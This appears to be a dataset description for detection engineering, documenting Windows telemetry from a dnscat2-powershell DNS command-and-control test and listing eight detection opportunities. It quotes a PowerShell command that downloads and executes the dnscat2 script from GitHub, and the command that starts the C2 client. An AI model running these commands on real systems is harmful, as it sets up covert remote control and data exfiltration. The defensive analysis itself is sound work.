# T1071.004-4: DNS — DNS (DNS C2) on Windows 11 Enterprise domain workstation

## Technique Context

T1071.004 (DNS) is a sub-technique of Application Layer Protocol (T1071) where adversaries leverage DNS for command and control communications. DNS C2 is particularly attractive to attackers because DNS traffic is rarely blocked, often bypasses network monitoring, and can exfiltrate data through various DNS record types. Common implementations encode commands and responses in DNS queries and responses, using techniques like domain generation algorithms (DGAs) or tunneling through TXT, A, MX, or CNAME records. The detection community focuses on identifying unusual DNS patterns including high query volumes to single domains, queries to non-existent domains, queries with suspicious entropy, and DNS traffic to known C2 infrastructure.

## What This Dataset Contains

This dataset captures a PowerShell-based DNS C2 implementation using the dnscat2-powershell tool. The attack begins with PowerShell downloading the dnscat2 script from GitHub: `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')` followed by `Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1`. 

The PowerShell script blocks reveal the complete dnscat2 implementation, including cryptographic functions (SHA-3, Salsa20), DNS packet crafting, and C2 protocol handling. Security event logs show the process chain: powershell.exe spawning child PowerShell processes, C# compiler executions (csc.exe and cvtres.exe), whoami.exe for system discovery, and nslookup.exe for DNS operations. Sysmon captures the network connection to GitHub (185.199.108.133:443) for script download, DNS resolution of raw.githubusercontent.com, and extensive .NET assembly loading including cryptographic libraries. File creation events show temporary directories and compilation artifacts in C:\Windows\SystemTemp\.

## What This Dataset Does Not Contain

The dataset lacks the actual DNS C2 communications because the configured DNS server (127.0.0.1) appears to be non-responsive. No DNS queries to the target domain "example.com" are captured, nor do we see the characteristic DNS tunneling traffic patterns that would indicate successful C2 establishment. The nslookup.exe process starts but doesn't generate observable DNS C2 traffic. Additionally, there are no network connections to external DNS infrastructure beyond the initial GitHub download, and no evidence of data exfiltration through DNS channels. The script compilation succeeds (creating .dll files), but the actual C2 functionality appears to fail silently, likely due to the invalid DNS server configuration pointing to localhost.

## Assessment

This dataset provides excellent coverage of the initial deployment phase of DNS C2 but limited visibility into operational C2 communications. The PowerShell script blocks contain the complete dnscat2 implementation, making this valuable for understanding DNS tunneling techniques, cryptographic implementations, and PowerShell-based C2 frameworks. The process execution chains, .NET compilation artifacts, and network connections for initial access are well-documented across multiple telemetry sources. However, the lack of actual DNS C2 traffic limits its utility for developing detections focused on the communications phase of the technique. The dataset is strongest for detecting DNS C2 deployment and weakest for detecting operational DNS tunneling patterns.

## Detection Opportunities Present in This Data

1. **PowerShell DNS C2 framework download** - Network connection to raw.githubusercontent.com downloading dnscat2-powershell script, detectable via HTTP/HTTPS traffic analysis and GitHub domain monitoring

2. **DNS C2 PowerShell command line patterns** - Security event 4688 captures `Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1` command execution, indicating DNS C2 tool usage

3. **Cryptographic library compilation** - Multiple csc.exe processes compiling cryptographic implementations (SHA-3, Salsa20) detectable through process creation events and file system artifacts

4. **DNS C2 script block analysis** - PowerShell event 4104 contains complete dnscat2 source code including DNS packet crafting functions, encryption routines, and C2 protocol implementation

5. **Suspicious .NET temporary file creation** - Sysmon event 11 shows creation of compilation artifacts in C:\Windows\SystemTemp\ with random directory names, indicating dynamic code compilation

6. **Process injection patterns** - Sysmon event 10 shows PowerShell accessing spawned processes (whoami.exe, csc.exe, nslookup.exe) with full access rights, typical of process hollowing or injection techniques

7. **nslookup.exe spawned by PowerShell** - Process creation of nslookup.exe from PowerShell context may indicate DNS tunneling tool usage, particularly when combined with network discovery commands

8. **DNS resolver changes** - PowerShell configuring custom DNS server (127.0.0.1) suggests DNS traffic redirection for C2 purposes
